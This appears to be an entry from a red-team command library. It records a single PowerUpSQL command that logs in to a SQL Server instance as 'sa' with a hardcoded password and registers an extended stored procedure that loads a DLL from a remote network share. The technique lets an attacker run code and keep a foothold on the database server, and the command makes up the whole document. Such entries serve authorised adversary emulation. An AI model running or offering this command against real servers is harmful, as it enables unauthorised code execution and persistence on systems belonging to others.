---
id: b40dc3c4-3a7a-4e6f-9390-747f513c84a6
name: Load DLL and call xp_test
type: command
executor: bash
data: Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>"
  -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
output: null
created_at: '2023-04-06T03:56:20.295423+00:00'
updated_at: '2023-04-10T20:36:30.722000+00:00'
---

# Load DLL and call xp_test

```bash
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
```
